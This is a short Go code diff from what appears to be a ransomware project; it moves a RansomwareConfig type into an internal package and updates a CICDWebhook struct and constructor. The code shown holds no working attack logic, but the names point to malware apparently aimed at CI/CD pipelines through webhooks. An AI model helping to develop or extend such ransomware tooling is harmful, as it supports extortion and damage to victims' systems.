@@ -1,5 +1,7 @@
 package ransomware
 
+import rw "github.com/ruby570bocadito/x404x/internal/ransomware"
+
 import (
 	"bytes"
 	"encoding/base64"
@@ -16,7 +18,7 @@ import (
 )
 
 type CICDWebhook struct {
-	config      *RansomwareConfig
+	config      *rw.RansomwareConfig
 	httpClient  *http.Client
 	webhookURLs []string
 }
@@ -28,7 +30,7 @@ type CICDTarget struct {
 	Type     string
 }
 
-func NewCICDWebhook(cfg *RansomwareConfig) *CICDWebhook {
+func NewCICDWebhook(cfg *rw.RansomwareConfig) *CICDWebhook {
 	return &CICDWebhook{
 		config: cfg,
 		httpClient: &http.Client{
